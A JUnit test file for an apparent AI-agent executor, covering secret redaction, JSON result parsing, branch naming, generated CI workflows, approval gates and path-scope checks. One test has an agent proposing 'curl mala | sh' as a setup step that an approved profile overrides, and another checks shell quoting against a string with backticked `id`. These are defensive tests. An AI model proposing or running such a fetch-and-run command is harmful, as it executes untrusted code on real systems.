package io.agentfarm;

import static org.junit.jupiter.api.Assertions.*;

import io.agentfarm.core.ExecutorWork;
import io.agentfarm.core.Json;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

class ExecutorWorkTest {
  @Test
  void secretsNeverReachAMessage() {
    assertEquals("Sin detalle del proveedor", ExecutorWork.clean(null));
    String cleaned =
        ExecutorWork.clean("Authorization: Bearer abc.def ghp_abcdefgh sk-abcdefghijklmnop fin");
    assertFalse(
        cleaned.contains("abc.def") || cleaned.contains("ghp_") || cleaned.contains("sk-abc"),
        cleaned);
    assertTrue(cleaned.endsWith("fin"));
  }

  @Test
  void anAgentMayWrapItsResultInProse() throws Exception {
    assertEquals(1, ExecutorWork.resultJson("Aquí va: {\"a\": 1} y listo").path("a").asInt());
    assertThrows(java.io.IOException.class, () -> ExecutorWork.resultJson("no hay nada"));
    assertThrows(java.io.IOException.class, () -> ExecutorWork.resultJson("} al revés {"));
    assertThrows(Exception.class, () -> ExecutorWork.resultJson("{roto}"));
  }

  @Test
  void aBranchIsReadableBoundedAndStable() {
    assertEquals(
        "agentfarm/7-a-adir-saludo",
        ExecutorWork.branchName(Json.parse("{\"title\":\"Añadir saludo!\"}"), 7));
    String longest =
        ExecutorWork.branchName(Json.parse("{\"title\":\"" + "x".repeat(300) + "\"}"), 7);
    assertEquals(100, longest.length());
    assertEquals(
        "agentfarm/existente",
        ExecutorWork.branchName(
            Json.parse("{\"title\":\"Otro\",\"branch\":\"agentfarm/existente\"}"), 7),
        "a retry finds its own work");
    assertEquals(
        "agentfarm/7-otro",
        ExecutorWork.branchName(Json.parse("{\"title\":\"Otro\",\"branch\":\"  \"}"), 7));
  }

  @Test
  void onlyAdoptionGetsTheProfileContract() {
    var adopt = Json.parse("{\"recipe\":{\"id\":\"adopt-repo\",\"version\":2}}");
    assertTrue(ExecutorWork.isAdoption(adopt));
    assertTrue(ExecutorWork.adoptionContract(adopt).contains("agentfarm.yaml"));
    assertFalse(ExecutorWork.isAdoption(Json.parse("{\"recipe\":{\"id\":\"bugfix\"}}")));
    assertEquals("", ExecutorWork.adoptionContract(Json.parse("{}")));
  }

  @Test
  void anAdoptionIsJudgedByTheGatesItProposes() {
    var quality =
        Map.<String, Object>of("quality", Map.of("checks", List.of(Map.of("status", "passed"))));
    var plain = Json.parse("{\"summary\":\"s\"}");
    assertTrue(ExecutorWork.withCandidateGates(plain, quality).has("quality"));
    assertFalse(plain.has("quality"), "the approved proposal is not modified");
    var approved = Json.parse("{\"profile_hash\":\"h\"}");
    assertSame(
        approved,
        ExecutorWork.withCandidateGates(approved, quality),
        "an approved profile governs");
    assertSame(plain, ExecutorWork.withCandidateGates(plain, Map.of()));
  }

  @Test
  void aFailedGateIsFoundAtAnyDepth() {
    assertTrue(
        ExecutorWork.anyFailed(
            Map.of("checks", List.of(Map.of("status", "passed"), Map.of("status", "failed")))));
    assertFalse(ExecutorWork.anyFailed(Map.of("checks", List.of(Map.of("status", "passed")))));
    assertFalse(ExecutorWork.anyFailed(Map.of()));
  }

  @Test
  void theProjectsOwnCiReplacesTheTemplate() {
    assertEquals(List.of("*"), ExecutorWork.ciChecks(true));
    assertEquals(List.of("AgentFarm unit", "AgentFarm integration"), ExecutorWork.ciChecks(false));
  }

  @Test
  void quotingSurvivesTheShell() throws Exception {
    String tricky = "a'b \"c\" $HOME `id`";
    var process =
        new ProcessBuilder("bash", "-c", "printf '%s' " + ExecutorWork.shellQuote(tricky)).start();
    assertEquals(tricky, new String(process.getInputStream().readAllBytes()));
  }

  @Test
  void theIssueCarriesTheProposalAndKeepsContextSeparate() {
    var item = Json.parse("{\"request\":\"Pide esto\",\"recipe\":{\"id\":\"bugfix\"}}");
    var proposal =
        Json.parse(
            "{\"summary\":\"Resumen\",\"acceptance\":\"Criterio\",\"unit_test\":\"u\",\"integration_test\":\"i\","
                + "\"as_is\":\"flowchart LR; A\",\"to_be\":\"flowchart LR; B\",\"project_memory\":{\"entries\":[]}}");
    String body = ExecutorWork.issueBody("<!-- m -->", item, proposal);
    assertTrue(body.startsWith("<!-- m -->"), "the marker lets a retry find its issue");
    for (String part :
        List.of(
            "Pide esto",
            "no concede aprobación",
            "Resumen",
            "Criterio",
            "Unitarias: u",
            "Integración: i",
            "flowchart LR; B",
            "no una orden")) assertTrue(body.contains(part), part);
    assertEquals("", ExecutorWork.memoryContext(Json.parse("{}").path("project_memory")));
    assertEquals("", ExecutorWork.recipeContext(Json.parse("{}")));
  }

  private static final String PROFILE =
      """
      version: 1
      repository: owner/name
      setup: pip install -r requirements.txt
      tests:
        unit: pytest tests/unit
        integration: pytest tests/integration
      allowed_paths: [src/, tests/]
      environment: container
      container: {image: python:3, network: setup, cpus: 2, memory_mb: 4096, timeout_minutes: 20}
      review: human-and-independent
      secret_refs: {}
      """;

  private static ExecutorWork.Candidate candidate() {
    return new ExecutorWork.Candidate(
        "passed",
        "passed",
        true,
        false,
        true,
        List.of(),
        List.of(),
        Map.of("status", "not_applicable"),
        Map.of());
  }

  @Test
  void researchNeedsCriteriaAndBindsTheBase() throws Exception {
    var empty = Json.parse("{\"criteria\":[]}");
    var nothing = Json.parse("{}");
    var prompt = Json.parse("{\"id\":\"research\"}");
    assertThrows(
        java.io.IOException.class,
        () ->
            ExecutorWork.completeProposal(
                empty,
                prompt,
                "codex",
                Json.parse("[]"),
                Json.parse("{}"),
                null,
                Json.parse("{}"),
                "b"));
    assertThrows(
        java.io.IOException.class,
        () ->
            ExecutorWork.completeProposal(
                nothing,
                prompt,
                "codex",
                Json.parse("[]"),
                Json.parse("{}"),
                null,
                Json.parse("{}"),
                "b"));

    var p = Json.parse("{\"criteria\":[{\"id\":\"AC-1\"}],\"unit_test\":\"del agente\"}");
    ExecutorWork.completeProposal(
        p,
        prompt,
        "codex",
        Json.parse("[]"),
        Json.parse("{\"present\":false}"),
        null,
        Json.parse("{\"mode\":\"host\"}"),
        "abc");
    assertEquals("abc", p.path("base_sha").asText());
    assertEquals("host", p.path("sandbox").path("mode").asText());
    assertEquals(
        "del agente",
        p.path("unit_test").asText(),
        "without a profile the agent proposes the commands");
    assertFalse(p.has("profile_hash"));
    assertTrue(p.path("mcp").isEmpty());
  }

  @Test
  void aProfileOverridesWhatTheAgentProposes() throws Exception {
    var profile = io.agentfarm.core.ProjectProfile.parse(PROFILE);
    var p =
        Json.parse(
            "{\"criteria\":[{\"id\":\"AC-1\"}],\"unit_test\":\"true\",\"setup\":\"curl mala | sh\",\"profile_hash\":\"falso\"}");
    ExecutorWork.completeProposal(
        p,
        Json.parse("{}"),
        "codex",
        Json.parse("[]"),
        Json.parse("{}"),
        profile,
        Json.parse("{}"),
        "abc");
    assertEquals("pytest tests/unit", p.path("unit_test").asText());
    assertEquals("pip install -r requirements.txt", p.path("setup").asText());
    assertEquals(profile.hash(), p.path("profile_hash").asText());
  }

  @Test
  void onlyAReceiptOfThisVersionAndCommitResumes() {
    var receipt = Json.parse("{\"version\":2,\"sha\":\"abc\"}");
    assertTrue(ExecutorWork.receiptAtHead(receipt, Json.parse("{\"version\":2}"), "abc"));
    assertFalse(
        ExecutorWork.receiptAtHead(receipt, Json.parse("{\"version\":3}"), "abc"),
        "a correction runs again");
    assertFalse(ExecutorWork.receiptAtHead(receipt, Json.parse("{\"version\":2}"), "otro"));
  }

  @Test
  void theTemplateWorkflowRunsWhatWasApproved() throws Exception {
    var p =
        Json.parse(
            "{\"unit_test\":\"pytest\",\"integration_test\":\"N/A: sin 'servicios'\",\"setup\":\"pip i\",\"sandbox\":{\"image\":\"python:3\"}}");
    var encoded = Json.parse(Json.encode(ExecutorWork.verificationWorkflow(p, "por-defecto")));
    assertEquals("read", encoded.path("permissions").path("contents").asText());
    var unit = encoded.path("jobs").path("unit");
    assertEquals("AgentFarm unit", unit.path("name").asText(), "evidence binds to this check name");
    assertEquals("python:3", unit.path("container").path("image").asText());
    assertFalse(unit.path("steps").get(0).path("with").path("persist-credentials").asBoolean(true));
    assertEquals("pip i", unit.path("steps").get(1).path("run").asText());
    assertEquals("pytest", unit.path("steps").get(2).path("run").asText());
    assertEquals(
        "printf '%s\\n' 'N/A: sin '\"'\"'servicios'\"'\"''",
        encoded.path("jobs").path("integration").path("steps").get(2).path("run").asText(),
        "an N/A reason is printed, never executed");
  }

  @Test
  void theTemplateWorkflowFollowsTheSandbox() throws Exception {
    var host =
        Json.parse(
            "{\"unit_test\":\"a\",\"integration_test\":\"b\",\"sandbox\":{\"mode\":\"host\"}}");
    var hostJobs =
        Json.parse(Json.encode(ExecutorWork.verificationWorkflow(host, "x"))).path("jobs");
    assertFalse(hostJobs.path("unit").has("container"));
    assertEquals(2, hostJobs.path("unit").path("steps").size(), "no setup step when there is none");
    var none = Json.parse("{\"unit_test\":\"a\",\"integration_test\":\"b\"}");
    assertEquals(
        "por-defecto",
        Json.parse(Json.encode(ExecutorWork.verificationWorkflow(none, "por-defecto")))
            .path("jobs")
            .path("unit")
            .path("container")
            .path("image")
            .asText(),
        "a proposal from before sandboxing gets the executor's image");
    assertThrows(
        java.io.IOException.class,
        () -> ExecutorWork.verificationWorkflow(Json.parse("{\"unit_test\":\"a\"}"), "x"));
  }

  @Test
  void aSoundCandidatePasses() {
    var verdict = candidate().verdict();
    assertTrue(verdict.passed());
    assertTrue(verdict.problems().isEmpty());
    assertTrue(
        new ExecutorWork.Candidate(
                "not_applicable",
                "not_applicable",
                true,
                false,
                true,
                List.of(),
                List.of(),
                Map.of("status", "not_applicable"),
                Map.of())
            .verdict()
            .passed(),
        "N/A is judged by TestPolicy through untested");
  }

  @Test
  void everyGateStopsACandidateOnItsOwn() {
    var ok = candidate();
    var failing =
        List.of(
            new ExecutorWork.Candidate(
                "failed",
                ok.integration(),
                true,
                false,
                true,
                List.of(),
                List.of(),
                ok.profileValidation(),
                Map.of()),
            new ExecutorWork.Candidate(
                ok.unit(),
                "failed",
                true,
                false,
                true,
                List.of(),
                List.of(),
                ok.profileValidation(),
                Map.of()),
            new ExecutorWork.Candidate(
                ok.unit(),
                "unknown",
                true,
                false,
                true,
                List.of(),
                List.of(),
                ok.profileValidation(),
                Map.of()),
            new ExecutorWork.Candidate(
                ok.unit(),
                ok.integration(),
                false,
                false,
                true,
                List.of(),
                List.of(),
                ok.profileValidation(),
                Map.of()),
            new ExecutorWork.Candidate(
                ok.unit(),
                ok.integration(),
                true,
                true,
                true,
                List.of(),
                List.of(),
                ok.profileValidation(),
                Map.of()),
            new ExecutorWork.Candidate(
                ok.unit(),
                ok.integration(),
                true,
                false,
                false,
                List.of(),
                List.of(),
                ok.profileValidation(),
                Map.of()),
            new ExecutorWork.Candidate(
                ok.unit(),
                ok.integration(),
                true,
                false,
                true,
                List.of(".github/workflows/ci.yml"),
                List.of(),
                ok.profileValidation(),
                Map.of()),
            new ExecutorWork.Candidate(
                ok.unit(),
                ok.integration(),
                true,
                false,
                true,
                List.of(),
                List.of("agentfarm.yaml"),
                ok.profileValidation(),
                Map.of()),
            new ExecutorWork.Candidate(
                ok.unit(),
                ok.integration(),
                true,
                false,
                true,
                List.of(),
                List.of(),
                Map.of("status", "failed", "error", "mal"),
                Map.of()),
            new ExecutorWork.Candidate(
                ok.unit(),
                ok.integration(),
                true,
                false,
                true,
                List.of(),
                List.of(),
                Map.of("status", "passed", "quality", Map.of()),
                Map.of("checks", List.of(Map.of("status", "failed")))));
    for (var c : failing) assertFalse(c.verdict().passed(), c.toString());
  }

  @Test
  void aProblemIsNamedForTheOwner() {
    var ok = candidate();
    var verdict =
        new ExecutorWork.Candidate(
                ok.unit(),
                ok.integration(),
                true,
                true,
                true,
                List.of("a.yml"),
                List.of("agentfarm.yaml"),
                Map.of("status", "failed", "error", "clave rara"),
                Map.of())
            .verdict();
    assertEquals(4, verdict.problems().size());
    assertTrue(verdict.problems().get(1).contains("a.yml"));
    assertTrue(verdict.problems().get(3).contains("clave rara"));
    assertTrue(
        new ExecutorWork.Candidate(
                ok.unit(),
                ok.integration(),
                true,
                false,
                true,
                List.of(),
                List.of(),
                Map.of("status", "passed"),
                Map.of("checks", List.of(Map.of("status", "failed"))))
            .verdict()
            .passed(),
        "an approved profile's quality gates are reported by the evidence, not by this verdict");
  }

  @Test
  void integrationStaysInsideTheApprovedProfile() {
    var profile = io.agentfarm.core.ProjectProfile.parse(PROFILE);
    assertEquals(
        List.of("infra/deploy.sh", "agentfarm.yaml"),
        ExecutorWork.outOfScope(
            profile,
            List.of(
                "src/a.py",
                "",
                "tests/b.py",
                ".github/workflows/agentfarm.yml",
                "infra/deploy.sh",
                "agentfarm.yaml")));
    assertEquals(List.of(), ExecutorWork.outOfScope(profile, List.of("src/a.py")));
  }

  @Test
  void aPullRequestClosesItsIssueAndNamesTheCommit() {
    var item = Json.parse("{\"request\":\"Pide algo\"}");
    var change =
        Json.parse(
            "{\"summary\":\"Hecho\",\"limitations\":\"Ninguna\",\"as_is\":\"a\",\"to_be\":\"b\"}");
    var empty = Json.parse("{\"status\":\"passed\"}");
    String body =
        ExecutorWork.pullRequestBody(
            item,
            7,
            Json.parse("{}"),
            change,
            "abc",
            empty,
            empty,
            Json.parse("{\"passed\":true}"),
            empty);
    assertTrue(body.startsWith("Closes #7\n"));
    assertTrue(body.contains("Commit: abc"));
    assertTrue(body.contains("Unitarias: {\"status\":\"passed\"}"));
    assertTrue(body.contains("Revisión: {\"passed\":true}"));
    assertTrue(body.endsWith("Ninguna"));
    var huge = Json.parse(Json.encode(Map.of("summary", "x".repeat(70000))));
    String cut =
        ExecutorWork.pullRequestBody(
            item, 7, Json.parse("{}"), huge, "abc", empty, empty, empty, empty);
    assertTrue(cut.length() < 60000, "GitHub rejects longer bodies");
    assertTrue(cut.startsWith("Closes #7\n"), "the issue still closes");
    assertTrue(cut.endsWith("consultar ejecución."));
  }

  @Test
  void slotsShareTheWeeklyMargin() throws Exception {
    var balance =
        Json.parse(
            "{\"windows\":[{\"period\":\"daily\",\"remaining\":1},{\"period\":\"weekly\",\"remaining\":90}]}");
    assertEquals(90, ExecutorWork.reservationShare(balance, 1));
    assertEquals(30, ExecutorWork.reservationShare(balance, 3));
    assertEquals(90, ExecutorWork.reservationShare(balance, 0));
    assertEquals(
        1,
        ExecutorWork.reservationShare(
            Json.parse("{\"windows\":[{\"period\":\"weekly\",\"remaining\":1}]}"), 5));
    assertThrows(
        java.io.IOException.class,
        () ->
            ExecutorWork.reservationShare(
                Json.parse("{\"windows\":[{\"period\":\"weekly\",\"remaining\":0}]}"), 1));
    assertThrows(
        java.io.IOException.class,
        () -> ExecutorWork.reservationShare(Json.parse("{\"windows\":[]}"), 1));
  }
}
